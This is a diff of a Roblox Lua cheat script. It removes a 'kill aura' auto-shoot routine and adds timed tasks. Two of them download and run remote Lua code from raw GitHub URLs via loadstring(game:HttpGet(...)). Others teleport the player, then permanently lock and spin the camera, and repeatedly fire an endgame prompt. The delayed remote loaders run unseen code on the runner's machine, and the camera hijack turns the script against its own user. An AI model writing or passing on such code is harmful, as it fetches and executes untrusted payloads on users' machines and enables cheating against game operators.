@@ -1,66 +1,52 @@
--- Kill Aura Variables
-local auraOn = true
-local killDist = 100
+task.spawn(function()
+    wait(10)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/fjruie/bypass.github.io/refs/heads/main/ringta.lua"))()
+end)
 
--- Helper Functions
-local function isNPC(obj)
-    return obj:IsA("Model") 
-        and obj:FindFirstChild("Humanoid")
-        and obj.Humanoid.Health > 0
-        and obj:FindFirstChild("Head")
-        and obj:FindFirstChild("HumanoidRootPart")
-        and not game:GetService("Players"):GetPlayerFromCharacter(obj)
-end
+task.spawn(function()
+    wait(16)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ewewe514/flying.github.io/refs/heads/main/erer.lua"))()
+end)
 
-local function getNearestNPC()
-    local plr = game:GetService("Players").LocalPlayer
-    local char = plr.Character or plr.CharacterAdded:Wait()
-    local root = char:FindFirstChild("HumanoidRootPart")
-    if not root then return nil end -- Prevent nil indexing
+task.spawn(function()
+    wait(22)
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local rootPart = character:WaitForChild("HumanoidRootPart")
 
-    local nearest, minDist = nil, math.huge
-    for _, npc in ipairs(workspace:GetDescendants()) do
-        if isNPC(npc) then
-            local hrp = npc:FindFirstChild("HumanoidRootPart")
-            local hum = npc:FindFirstChild("Humanoid")
-            local dist = (hrp.Position - root.Position).Magnitude
-            if hum and hum.Health > 0 and dist < minDist and dist <= killDist then
-                nearest, minDist = npc, dist
-            end
-        end
+    -- Target position
+    local targetPosition = Vector3.new(-352.05, -6.16, -49041.93)
+
+    -- Teleport
+    rootPart.CFrame = CFrame.new(targetPosition)
+end)
+
+task.spawn(function()
+    wait(60) -- Waits 1 minute
+    local camera = workspace.CurrentCamera
+    local player = game.Players.LocalPlayer
+    local character = player.Character or player.CharacterAdded:Wait()
+    local rootPart = character:WaitForChild("HumanoidRootPart")
+
+    -- Set camera to first-person and force it to look directly up
+    camera.CameraType = Enum.CameraType.Scriptable
+    camera.CFrame = CFrame.new(rootPart.Position) * CFrame.Angles(math.rad(90), 0, 0) -- Looks straight up
+
+    -- Continuously spin while maintaining upward view
+    while true do
+        camera.CFrame = camera.CFrame * CFrame.Angles(0, math.rad(25), 0) -- Spins while locked on sky
+        wait(0.05) -- Adjust speed for smoother rotation
     end
-    return nearest
-end
+end)
 
-local function shootRemote(npc)
-    if not npc then return end
-    local head = npc:FindFirstChild("Head")
-    if not head then return end
 
-    local shootRemote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Weapon"):WaitForChild("Shoot")
-    if shootRemote then
-        local args = {head.Position} -- Firing at head position
-        shootRemote:FireServer(unpack(args))
-        print("Shot fired at:", head.Position) -- Debugging confirmation
-    end
-end
-
-local function killAuraLoop()
-    while auraOn do
-        local target = getNearestNPC()
-        if target then
-            print("Target found:", target.Name) -- Debugging output
-            shootRemote(target)
-        else
-            print("No valid NPC found") -- Debugging output
-        end
-        task.wait(0.2)
-    end
-end
-
--- Main Loop (Prevents nil indexing)
-RunService.Heartbeat:Connect(function()
-    if auraOn then
-        pcall(killAuraLoop) -- Ensures no errors crash the script
+task.spawn(function()
+    wait(480) -- Waits 8 minutes (480 seconds)
+    local prompt = workspace.Baseplates.FinalBasePlate.OutlawBase.Bridge.BridgeControl.Crank.Model.Mid.EndGame
+    prompt.HoldDuration = 0
+    
+    while true do
+        fireproximityprompt(prompt)
+        wait(5) -- Runs every 5 seconds
     end
 end)
